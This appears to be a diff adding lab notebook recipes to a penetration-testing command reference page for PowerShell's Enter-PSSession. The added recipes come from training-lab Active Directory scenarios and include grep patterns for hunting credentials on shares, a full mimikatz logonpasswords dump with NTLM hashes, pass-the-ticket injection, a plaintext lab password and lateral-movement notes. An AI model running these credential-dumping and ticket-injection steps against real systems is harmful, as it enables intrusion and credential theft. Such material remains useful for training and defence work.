@@ -11,6 +11,8 @@ hideFooterPagination: true
 
 Replace UPPER_CASE values with your lab values.
 
+[Search this tool’s saved examples](/commands/notebook?tool=enter-pssession) · [All tools](/index)
+
 **Requires:** WinRM access and an authorized account. Prefer the host FQDN with working domain DNS; an IP address may require a different trust/authentication setup.
 
 ## Check and connect
@@ -32,9 +34,430 @@ Invoke-Command -ComputerName HOST_FQDN -Credential DOMAIN\USER -ScriptBlock { wh
 
 [Find another command](/index) · [Ports](/enumeration/ports-cheatsheet)
 
-[More saved commands for this tool](https://dashboard-aed21664.mintlify.site/find-anything?q=Enter-PSSession)
+## Notebook recipes
 
-## Learning and original examples
+10 additional examples, grouped by task. Saved as written; prompts, output, original lab values and older syntax may be included.
 
-- [Windows Remote Access: RDP, WinRM, and WMI](/enumeration/windows-remote-management-protocols-cheat-sheet)
-- [Kerberos Double Hop](/active-directory/kerberos-double-hop)
+<AccordionGroup>
+
+<Accordion title="Accessing DC03 Using Enter-PSSession">
+
+### Accessing DC03 Using Enter-PSSession
+
+**Cross-Forest Trusts - Windows**
+
+```powershell
+PS C:\htb> Enter-PSSession -ComputerName ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -Credential INLANEFREIGHT\administrator
+
+[ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL]: PS C:\Users\administrator.INLANEFREIGHT\Documents> whoami
+inlanefreight\administrator
+
+[ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL]: PS C:\Users\administrator.INLANEFREIGHT\Documents> ipconfig /all
+
+Windows IP Configuration
+
+   Host Name . . . . . . . . . . . . : ACADEMY-EA-DC03
+   Primary Dns Suffix  . . . . . . . : FREIGHTLOGISTICS.LOCAL
+   Node Type . . . . . . . . . . . . : Hybrid
+   IP Routing Enabled. . . . . . . . : No
+   WINS Proxy Enabled. . . . . . . . : No
+   DNS Suffix Search List. . . . . . : FREIGHTLOGISTICS.LOCAL
+```
+
+</Accordion>
+
+<Accordion title="Find Credentials in Network Shares">
+
+### Find Credentials in Network Shares
+
+**Find Credentials in Network Shares**
+
+```bash
+# the domain prefix (most reliable signal)
+grep -ri "DOMAINNAME\\\\" .
+
+# UPN format
+grep -riE "[a-z]+@domain\.local" .
+
+# runas / net use / Invoke-Command patterns - operators leak creds in commands
+grep -riE "runas|net use|Invoke-Command|New-PSSession|ConvertTo-SecureString" .
+
+# anything with "service account" / "svc_" in filenames
+find . -iname "*svc*" -o -iname "*service*account*"
+```
+
+</Accordion>
+
+<Accordion title="Background">
+
+### Background
+
+**Kerberos Double Hop**
+
+```powershell
+PS C:\htb> PS C:\Users\ben.INLANEFREIGHT> Enter-PSSession -ComputerName DEV01 -Credential INLANEFREIGHT\backupadm
+[DEV01]: PS C:\Users\backupadm\Documents> cd 'C:\Users\Public\'
+[DEV01]: PS C:\Users\Public> .\mimikatz "privilege::debug" "sekurlsa::logonpasswords" exit
+
+  .#####.   mimikatz 2.2.0 (x64) #18362 Feb 29 2020 11:13:36
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/
+
+mimikatz(commandline) # privilege::debug
+Privilege '20' OK
+
+mimikatz(commandline) # sekurlsa::logonpasswords
+
+Authentication Id : 0 ; 45177 (00000000:0000b079)
+Session           : Interactive from 1
+User Name         : UMFD-1
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 6/28/2022 3:33:32 PM
+SID               : S-1-5-96-0-1
+        msv :
+         [00000003] Primary
+         * Username : DEV01$
+         * Domain   : INLANEFREIGHT
+         * NTLM     : ef6a3c65945643fbd1c3cf7639278b33
+         * SHA1     : a2cfa43b1d8224fc44cc629d4dc167372f81543f
+        tspkg :
+        wdigest :
+         * Username : DEV01$
+         * Domain   : INLANEFREIGHT
+         * Password : (null)
+        kerberos :
+         * Username : DEV01$
+         * Domain   : INLANEFREIGHT.LOCAL
+         * Password : fb ec 60 8b 93 99 ee 24 a1 dd bf fa a8 da fd 61 cc 14 5c 30 ea 6a e9 f4 bb bc ca 1f be a7 9e ce 8b 79 d8 cb 4d 65 d3 42 e7 a1 98 ad 8e 43 3e b5 77 80 40 c4 ce 61 27 90 37 dc d8 62 e1 77 7a 48 2d b2 d8 9f 4b b8 7a be e8 a4 20 3b 1e 32 67 a6 21 4a b8 e3 ac 01 00 d2 c3 68 37 fd ad e3 09 d7 f1 15 0d 52 ce fb 6d 15 8d b3 c8 c1 a3 c1 82 54 11 f9 5f 21 94 bb cb f7 cc 29 ba 3c c9 5d 5d 41 50 89 ea 79 38 f3 f2 3f 64 49 8a b0 83 b4 33 1b 59 67 9e b2 d1 d3 76 99 3c ae 5c 7c b7 1f 0d d5 fb cc f9 e2 67 33 06 fe 08 b5 16 c6 a5 c0 26 e0 30 af 37 28 5e 3b 0e 72 b8 88 7f 92 09 2e c4 2a 10 e5 0d f4 85 e7 53 5f 9c 43 13 90 61 62 97 72 bf bf 81 36 c0 6f 0f 4e 48 38 b8 c4 ca f8 ac e0 73 1c 2d 18 ee ed 8f 55 4d 73 33 a4 fa 32 94 a9
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 1284107 (00000000:0013980b)
+Session           : Interactive from 1
+User Name         : srvadmin
+Domain            : INLANEFREIGHT
+Logon Server      : DC01
+Logon Time        : 6/28/2022 3:46:05 PM
+SID               : S-1-5-21-1666128402-2659679066-1433032234-1107
+        msv :
+         [00000003] Primary
+         * Username : srvadmin
+         * Domain   : INLANEFREIGHT
+         * NTLM     : cf3a5525ee9414229e66279623ed5c58
+         * SHA1     : 3c7374127c9a60f9e5b28d3a343eb7ac972367b2
+         * DPAPI    : 64fa83034ef8a3a9b52c1861ac390bce
+        tspkg :
+        wdigest :
+         * Username : srvadmin
+         * Domain   : INLANEFREIGHT
+         * Password : (null)
+        kerberos :
+         * Username : srvadmin
+         * Domain   : INLANEFREIGHT.LOCAL
+         * Password : (null)
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 70669 (00000000:0001140d)
+Session           : Interactive from 1
+User Name         : DWM-1
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 6/28/2022 3:33:33 PM
+SID               : S-1-5-90-0-1
+        msv :
+         [00000003] Primary
+         * Username : DEV01$
+         * Domain   : INLANEFREIGHT
+         * NTLM     : ef6a3c65945643fbd1c3cf7639278b33
+         * SHA1     : a2cfa43b1d8224fc44cc629d4dc167372f81543f
+        tspkg :
+        wdigest :
+         * Username : DEV01$
+         * Domain   : INLANEFREIGHT
+         * Password : (null)
+        kerberos :
+         * Username : DEV01$
+         * Domain   : INLANEFREIGHT.LOCAL
+         * Password : fb ec 60 8b 93 99 ee 24 a1 dd bf fa a8 da fd 61 cc 14 5c 30 ea 6a e9 f4 bb bc ca 1f be a7 9e ce 8b 79 d8 cb 4d 65 d3 42 e7 a1 98 ad 8e 43 3e b5 77 80 40 c4 ce 61 27 90 37 dc d8 62 e1 77 7a 48 2d b2 d8 9f 4b b8 7a be e8 a4 20 3b 1e 32 67 a6 21 4a b8 e3 ac 01 00 d2 c3 68 37 fd ad e3 09 d7 f1 15 0d 52 ce fb 6d 15 8d b3 c8 c1 a3 c1 82 54 11 f9 5f 21 94 bb cb f7 cc 29 ba 3c c9 5d 5d 41 50 89 ea 79 38 f3 f2 3f 64 49 8a b0 83 b4 33 1b 59 67 9e b2 d1 d3 76 99 3c ae 5c 7c b7 1f 0d d5 fb cc f9 e2 67 33 06 fe 08 b5 16 c6 a5 c0 26 e0 30 af 37 28 5e 3b 0e 72 b8 88 7f 92 09 2e c4 2a 10 e5 0d f4 85 e7 53 5f 9c 43 13 90 61 62 97 72 bf bf 81 36 c0 6f 0f 4e 48 38 b8 c4 ca f8 ac e0 73 1c 2d 18 ee ed 8f 55 4d 73 33 a4 fa 32 94 a9
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 45178 (00000000:0000b07a)
+Session           : Interactive from 0
+User Name         : UMFD-0
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 6/28/2022 3:33:32 PM
+SID               : S-1-5-96-0-0
+        msv :
+         [00000003] Primary
+         * Username : DEV01$
+         * Domain   : INLANEFREIGHT
+         * NTLM     : ef6a3c65945643fbd1c3cf7639278b33
+         * SHA1     : a2cfa43b1d8224fc44cc629d4dc167372f81543f
+        tspkg :
+        wdigest :
+         * Username : DEV01$
+         * Domain   : INLANEFREIGHT
+         * Password : (null)
+        kerberos :
+         * Username : DEV01$
+         * Domain   : INLANEFREIGHT.LOCAL
+         * Password : fb ec 60 8b 93 99 ee 24 a1 dd bf fa a8 da fd 61 cc 14 5c 30 ea 6a e9 f4 bb bc ca 1f be a7 9e ce 8b 79 d8 cb 4d 65 d3 42 e7 a1 98 ad 8e 43 3e b5 77 80 40 c4 ce 61 27 90 37 dc d8 62 e1 77 7a 48 2d b2 d8 9f 4b b8 7a be e8 a4 20 3b 1e 32 67 a6 21 4a b8 e3 ac 01 00 d2 c3 68 37 fd ad e3 09 d7 f1 15 0d 52 ce fb 6d 15 8d b3 c8 c1 a3 c1 82 54 11 f9 5f 21 94 bb cb f7 cc 29 ba 3c c9 5d 5d 41 50 89 ea 79 38 f3 f2 3f 64 49 8a b0 83 b4 33 1b 59 67 9e b2 d1 d3 76 99 3c ae 5c 7c b7 1f 0d d5 fb cc f9 e2 67 33 06 fe 08 b5 16 c6 a5 c0 26 e0 30 af 37 28 5e 3b 0e 72 b8 88 7f 92 09 2e c4 2a 10 e5 0d f4 85 e7 53 5f 9c 43 13 90 61 62 97 72 bf bf 81 36 c0 6f 0f 4e 48 38 b8 c4 ca f8 ac e0 73 1c 2d 18 ee ed 8f 55 4d 73 33 a4 fa 32 94 a9
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 44190 (00000000:0000ac9e)
+Session           : UndefinedLogonType from 0
+User Name         : (null)
+Domain            : (null)
+Logon Server      : (null)
+Logon Time        : 6/28/2022 3:33:32 PM
+SID               :
+        msv :
+         [00000003] Primary
+         * Username : DEV01$
+         * Domain   : INLANEFREIGHT
+         * NTLM     : ef6a3c65945643fbd1c3cf7639278b33
+         * SHA1     : a2cfa43b1d8224fc44cc629d4dc167372f81543f
+        tspkg :
+        wdigest :
+        kerberos :
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 999 (00000000:000003e7)
+Session           : UndefinedLogonType from 0
+User Name         : DEV01$
+Domain            : INLANEFREIGHT
+Logon Server      : (null)
+Logon Time        : 6/28/2022 3:33:32 PM
+SID               : S-1-5-18
+        msv :
+        tspkg :
+        wdigest :
+         * Username : DEV01$
+         * Domain   : INLANEFREIGHT
+         * Password : (null)
+        kerberos :
+         * Username : DEV01$
+         * Domain   : INLANEFREIGHT.LOCAL
+         * Password : (null)
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 1284140 (00000000:0013982c)
+Session           : Interactive from 1
+User Name         : srvadmin
+Domain            : INLANEFREIGHT
+Logon Server      : DC01
+Logon Time        : 6/28/2022 3:46:05 PM
+SID               : S-1-5-21-1666128402-2659679066-1433032234-1107
+        msv :
+         [00000003] Primary
+         * Username : srvadmin
+         * Domain   : INLANEFREIGHT
+         * NTLM     : cf3a5525ee9414229e66279623ed5c58
+         * SHA1     : 3c7374127c9a60f9e5b28d3a343eb7ac972367b2
+         * DPAPI    : 64fa83034ef8a3a9b52c1861ac390bce
+        tspkg :
+        wdigest :
+         * Username : srvadmin
+         * Domain   : INLANEFREIGHT
+         * Password : (null)
+        kerberos :
+         * Username : srvadmin
+         * Domain   : INLANEFREIGHT.LOCAL
+         * Password : (null)
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 70647 (00000000:000113f7)
+Session           : Interactive from 1
+User Name         : DWM-1
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 6/28/2022 3:33:33 PM
+SID               : S-1-5-90-0-1
+        msv :
+         [00000003] Primary
+         * Username : DEV01$
+         * Domain   : INLANEFREIGHT
+         * NTLM     : ef6a3c65945643fbd1c3cf7639278b33
+         * SHA1     : a2cfa43b1d8224fc44cc629d4dc167372f81543f
+        tspkg :
+        wdigest :
+         * Username : DEV01$
+         * Domain   : INLANEFREIGHT
+         * Password : (null)
+        kerberos :
+         * Username : DEV01$
+         * Domain   : INLANEFREIGHT.LOCAL
+         * Password : fb ec 60 8b 93 99 ee 24 a1 dd bf fa a8 da fd 61 cc 14 5c 30 ea 6a e9 f4 bb bc ca 1f be a7 9e ce 8b 79 d8 cb 4d 65 d3 42 e7 a1 98 ad 8e 43 3e b5 77 80 40 c4 ce 61 27 90 37 dc d8 62 e1 77 7a 48 2d b2 d8 9f 4b b8 7a be e8 a4 20 3b 1e 32 67 a6 21 4a b8 e3 ac 01 00 d2 c3 68 37 fd ad e3 09 d7 f1 15 0d 52 ce fb 6d 15 8d b3 c8 c1 a3 c1 82 54 11 f9 5f 21 94 bb cb f7 cc 29 ba 3c c9 5d 5d 41 50 89 ea 79 38 f3 f2 3f 64 49 8a b0 83 b4 33 1b 59 67 9e b2 d1 d3 76 99 3c ae 5c 7c b7 1f 0d d5 fb cc f9 e2 67 33 06 fe 08 b5 16 c6 a5 c0 26 e0 30 af 37 28 5e 3b 0e 72 b8 88 7f 92 09 2e c4 2a 10 e5 0d f4 85 e7 53 5f 9c 43 13 90 61 62 97 72 bf bf 81 36 c0 6f 0f 4e 48 38 b8 c4 ca f8 ac e0 73 1c 2d 18 ee ed 8f 55 4d 73 33 a4 fa 32 94 a9
+        ssp :
+
+Authentication Id : 0 ; 996 (00000000:000003e4)
+User Name         : DEV01$
+Domain            : INLANEFREIGHT
+Logon Server      : (null)
+Logon Time        : 6/28/2022 3:33:32 PM
+SID               : S-1-5-20
+        msv :
+         [00000003] Primary
+         * Username : DEV01$
+         * Domain   : INLANEFREIGHT
+         * NTLM     : ef6a3c65945643fbd1c3cf7639278b33
+         * SHA1     : a2cfa43b1d8224fc44cc629d4dc167372f81543f
+        tspkg :
+        wdigest :
+         * Username : DEV01$
+         * Domain   : INLANEFREIGHT
+         * Password : (null)
+        kerberos :
+         * Username : DEV01$
+         * Domain   : INLANEFREIGHT.LOCAL
+         * Password : (null)
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 997 (00000000:000003e5)
+Session           : Service from 0
+User Name         : LOCAL SERVICE
+Domain            : NT AUTHORITY
+Logon Server      : (null)
+Logon Time        : 6/28/2022 3:33:33 PM
+SID               : S-1-5-19
+        msv :
+        tspkg :
+        wdigest :
+         * Username : (null)
+         * Domain   : (null)
+         * Password : (null)
+        kerberos :
+         * Username : (null)
+         * Domain   : (null)
+         * Password : (null)
+        ssp :
+        credman :
+
+mimikatz(commandline) # exit
+Bye!
+```
+
+</Accordion>
+
+<Accordion title="Workaround #2: Register PSSession Configuration">
+
+### Workaround #2: Register PSSession Configuration
+
+**Kerberos Double Hop**
+
+```powershell
+PS C:\htb> Enter-PSSession -ComputerName ACADEMY-AEN-DEV01.INLANEFREIGHT.LOCAL -Credential inlanefreight\backupadm
+```
+
+**Kerberos Double Hop**
+
+```powershell
+PS C:\htb> Enter-PSSession -ComputerName DEV01 -Credential INLANEFREIGHT\backupadm -ConfigurationName  backupadmsess
+[DEV01]: PS C:\Users\backupadm\Documents> klist
+
+Current LogonId is 0:0x2239ba
+
+Cached Tickets: (1)
+
+#0>     Client: backupadm @ INLANEFREIGHT.LOCAL
+       Server: krbtgt/INLANEFREIGHT.LOCAL @ INLANEFREIGHT.LOCAL
+       KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
+       Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
+       Start Time: 6/28/2022 13:24:37 (local)
+       End Time:   6/28/2022 23:24:37 (local)
+       Renew Time: 7/5/2022 13:24:37 (local)
+       Session Key Type: AES-256-CTS-HMAC-SHA1-96
+       Cache Flags: 0x1 -> PRIMARY
+       Kdc Called: DC01
+```
+
+</Accordion>
+
+<Accordion title="Step 3 — Use the ticket (lateral movement)">
+
+### Step 3 — Use the ticket (lateral movement)
+
+**Pass the Ticket from Windows**
+
+```cmd
+mimikatz # privilege::debug
+mimikatz # kerberos::ptt "C:\Users\Administrator.WIN01\Desktop\[0;1812a]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi"
+mimikatz # exit
+
+c:\tools> powershell
+PS C:\tools> Enter-PSSession -ComputerName DC01
+[DC01]: PS C:\Users\john\Documents> whoami
+inlanefreight\john
+```
+
+**Pass the Ticket from Windows**
+
+Context from the notebook: Launching  powershell  from that same  cmd.exe   inherits the ticket , so  Enter-PSSession -ComputerName DC01  authenticates over  WinRM with Kerberos  as the ticket owner — landing you on the DC as  john .
+
+```text
+Enter-PSSession -ComputerName DC01
+```
+
+</Accordion>
+
+<Accordion title="Establishing WinRM Session from Windows">
+
+### Establishing WinRM Session from Windows
+
+**Privileged Remote Access**
+
+```powershell
+PS C:\htb> $password = ConvertTo-SecureString "Klmcargo2" -AsPlainText -Force
+PS C:\htb> $cred = new-object System.Management.Automation.PSCredential ("INLANEFREIGHT\forend", $password)
+PS C:\htb> Enter-PSSession -ComputerName ACADEMY-EA-MS01 -Credential $cred
+
+[ACADEMY-EA-MS01]: PS C:\Users\forend\Documents> hostname
+ACADEMY-EA-MS01
+[ACADEMY-EA-MS01]: PS C:\Users\forend\Documents> Exit-PSSession
+PS C:\htb>
+```
+
+</Accordion>
+
+<Accordion title="Footprinting &amp; connecting">
+
+### Footprinting & connecting
+
+**Windows Remote Access: RDP, WinRM, and WMI**
+
+```powershell
+# From Windows
+Test-WsMan <host>                                  # is WinRM reachable?
+Enter-PSSession -ComputerName <IP> -Credential <domain\user>
+Invoke-Command -ComputerName <IP> -Credential <user> -ScriptBlock { whoami }
+```
+
+</Accordion>
+
+<Accordion title="Where it fits in a pentest">
+
+### Where it fits in a pentest
+
+**Pass the Ticket from Windows**
+
+Context from the notebook: PtT is core  lateral movement  in an AD engagement. Typical chain: land on a box →  sekurlsa::ekeys / tickets  or  Rubeus dump  → grab a privileged user's TGT (or  asktgt  from their key) → inject →  Enter-PSSession / impacket  to the next host or the DC. It's preferred over PtH when the environment is Kerberos-only or you want to stay AES-native and quieter. It also chains from other attacks that  yield  tickets: Kerberoasting, AS-REP roasting, unconstrained delegation, and  Pass the Certificate  (PKINIT → TGT).
+
+```text
+Enter-PSSession
+```
+
+</Accordion>
+
+</AccordionGroup>
